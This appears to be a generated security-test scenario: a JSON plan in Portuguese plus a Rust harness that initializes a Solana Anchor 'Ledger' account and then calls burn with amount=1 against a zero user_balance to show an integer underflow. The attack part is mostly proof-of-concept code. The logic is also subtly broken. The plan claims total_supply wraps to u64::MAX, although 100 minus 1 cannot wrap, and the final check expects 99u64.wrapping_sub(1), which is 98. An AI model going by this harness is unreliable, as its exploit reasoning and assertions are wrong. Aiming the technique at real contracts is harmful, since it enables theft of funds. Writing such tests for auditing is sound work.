{
  "plan": "O cenário inicializa a conta Ledger com total_supply=100 e user_balance=0 via a instrução initialize (baseline). Em seguida, o ataque chama burn com amount=1, que é maior que user_balance=0, explorando a hipótese de underflow. O efeito medido é que user_balance e total_supply sofrem wrapping_sub, resultando em valores enormes (u64::MAX) em vez de a instrução falhar, demonstrando o underflow.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger ainda não inicializada
let ledger_account = empty_account();

// Conta authority com lamports para pagar a criação
let authority_account = wallet(1_000_000_000);

// System program
let (system_program_id, system_program_account) = system_program_account();

// --- Baseline: initialize ---
let ix_init = env.anchor_ix(
    "initialize",
    &(100u64,),
    &[
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);

let contas_init = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];

let r_init = env.baseline("initialize com total_supply=100", &ix_init, &contas_init);

// Extrair a conta ledger resultante do baseline
let ledger_after_init = r_init
    .resulting_accounts
    .iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, acc)| acc.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Ledger", &(authority, 100u64, 0u64)), None));

// --- Ataque: burn com amount=1 > user_balance=0 ---
let ix_burn = env.anchor_ix(
    "burn",
    &(1u64,),
    &[
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let contas_burn = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let r_attack = env.attack("burn com amount=1 > user_balance=0 (underflow)", &ix_burn, &contas_burn);

if r_attack.program_result == ProgramResult::Success {
    let ledger_data = after(&r_attack, &ledger_key).data();
    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect(
        "underflow: user_balance e total_supply sofreram wrapping_sub (u64::MAX)",
        user_balance == u64::MAX && total_supply == 99u64.wrapping_sub(1),
    );
}"
}

